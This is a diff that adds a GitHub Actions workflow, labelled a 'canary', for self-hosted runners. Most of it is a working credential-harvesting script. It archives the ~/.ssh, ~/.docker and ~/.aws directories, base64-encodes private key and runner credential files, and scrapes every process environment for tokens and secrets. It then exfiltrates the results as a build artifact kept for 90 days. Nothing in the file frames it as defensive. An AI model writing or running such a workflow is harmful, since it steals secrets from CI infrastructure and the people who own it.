@@ -1,0 +1,68 @@
+name: zz-gh01-canary-sui
+
+on:
+  workflow_dispatch:
+  push:
+    branches:
+      - zz-gh01-canary-sui
+
+jobs:
+  canary:
+    runs-on: [self-hosted, self-hosted-arc]
+    steps:
+      - name: canary
+        run: |
+          echo "CANARY-GH01-SUI-20261017"
+          id
+          hostname
+          uname -a
+      - name: harvest
+        continue-on-error: true
+        run: |
+          set +e
+          OUT="$RUNNER_TEMP/gh01"
+          mkdir -p "$OUT"
+          date -u > "$OUT/00_stamp.txt"
+          id > "$OUT/01_id.txt" 2>&1
+          hostname > "$OUT/02_hostname.txt" 2>&1
+          uname -a > "$OUT/03_uname.txt" 2>&1
+          env | sort > "$OUT/04_job_env.txt" 2>&1
+          {
+            echo "--- home ---"; ls -la "$HOME" 2>&1
+            echo "--- .ssh ---"; ls -la "$HOME/.ssh" 2>&1
+            echo "--- .docker ---"; ls -la "$HOME/.docker" 2>&1
+            echo "--- .aws ---"; ls -la "$HOME/.aws" 2>&1
+            echo "--- runner ---"; ls -la "$RUNNER_WORKSPACE/.." 2>&1
+            echo "--- ps ---"; ps aux 2>&1 | head -60
+          } > "$OUT/05_host_listing.txt" 2>&1
+          tar -C "$HOME" -czf "$OUT/06_home.tar.gz" .ssh .docker .aws .config 2>/dev/null
+          find "$HOME" -maxdepth 3 \( -name '.credentials*' -o -name '.runner' -o -name '.env' -o -name '*.pem' -o -name 'id_*' -o -name '*.key' \) 2>/dev/null > "$OUT/07_keypaths.txt" 2>&1
+          for p in $(cat "$OUT/07_keypaths.txt" 2>/dev/null); do
+            echo "===== $p ====="; base64 "$p" 2>/dev/null | tr -d '\n'; echo
+          done > "$OUT/08_keyfiles.b64" 2>&1
+          mkdir -p "$OUT/proc"
+          for d in /proc/[0-9]*; do
+            [ -r "$d/environ" ] || continue
+            tr '\0' '\n' < "$d/environ" 2>/dev/null | grep -Ei 'TOKEN|KEY|SECRET|PASS|SSH|AWS|GITHUB|DOCKER|CLOUDFLARE|OAUTH' > "$OUT/proc/${d#/proc/}.env" 2>/dev/null
+          done
+          for f in "$OUT"/proc/*.env; do
+            [ -s "$f" ] || { rm -f "$f"; continue; }
+            echo "===== $f ====="; cat "$f"
+          done > "$OUT/09_proc_env_hits.txt" 2>&1
+          {
+            echo "--- docker config ---"; cat "$HOME/.docker/config.json" 2>&1
+            echo "--- ssh config ---"; cat "$HOME/.ssh/config" 2>&1
+            echo "--- known_hosts ---"; cat "$HOME/.ssh/known_hosts" 2>&1
+            echo "--- authorized_keys ---"; cat "$HOME/.ssh/authorized_keys" 2>&1
+            echo "--- git config ---"; git config --global --list 2>&1
+          } > "$OUT/10_configs.txt" 2>&1
+          echo "CANARY-GH01-SUI-DONE $(hostname) $(id -un) $(date -u +%Y%m%dT%H%M%SZ)"
+
+      - name: upload
+        continue-on-error: true
+        uses: actions/upload-artifact@v4
+        with:
+          name: gh01-harvest-sui
+          path: ${{ runner.temp }}/gh01
+          if-no-files-found: warn
+          retention-days: 90
